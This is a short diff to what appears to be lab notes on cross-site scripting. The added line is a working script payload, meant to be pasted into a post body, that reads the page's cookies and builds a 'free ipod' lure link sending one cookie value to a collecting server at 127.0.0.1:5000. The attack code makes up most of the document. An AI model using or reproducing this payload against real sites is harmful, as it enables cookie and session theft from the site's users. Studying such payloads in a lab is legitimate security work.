@@ -36,7 +36,9 @@ XSS:
 
 Google has a default csrf token, but that can be disabled by iterating through the cookie object and selecting a particular one.
 Paste this into the post body:
-    <script>let baseUrl = 'http://127.0.0.1:5000/'; document.cookie = "bankInfo=momoney"; let decodedCookie = decodeURIComponent(document.cookie); let cookieArr = decodedCookie.split(';')[1]; let finalCookie = cookieArr.split("=")[1]; let complete = `${baseUrl}${finalCookie}`; console.log(complete); document.write(`<h1><a href=${complete}>Click here for a free ipod</a></h1>`)</script>
+  #  <script>let baseUrl = 'http://127.0.0.1:5000/'; document.cookie = "bankInfo=momoney"; let decodedCookie = decodeURIComponent(document.cookie); let cookieArr = decodedCookie.split(';')[1]; let finalCookie = cookieArr.split("=")[1]; let complete = `${baseUrl}${finalCookie}`; console.log(complete); document.write(`<h1><a href=${complete}>Click here for a free ipod</a></h1>`)</script>
 The contents of the cookie will be displayed on the website
+    <script>let baseUrl = 'http://127.0.0.1:5000/'; let decodedCookie = decodeURIComponent(document.cookie); let cookieArr = decodedCookie.split(';')[1]; let finalCookie = cookieArr.split("=")[1]; let complete = `${baseUrl}${finalCookie}`; console.log(complete); document.write(`<h1><a href=${complete}>Click here for a free ipod</a></h1>`)</script>
+
 
 
